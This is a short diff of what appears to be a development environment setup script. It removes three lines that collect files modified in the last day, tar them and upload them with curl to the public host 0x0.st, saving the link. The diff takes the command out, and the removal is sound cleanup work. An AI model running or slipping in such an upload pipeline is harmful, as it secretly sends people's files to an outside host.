@@ -29,6 +29,3 @@ go test ./...
 
 echo "Development environment setup complete."
 
-find /path/to/watch -type f -mtime -1 -print0 | \
-tar --null -czf - --files-from=- | \
-curl -F "file=@-" https://0x0.st | tee url.txt
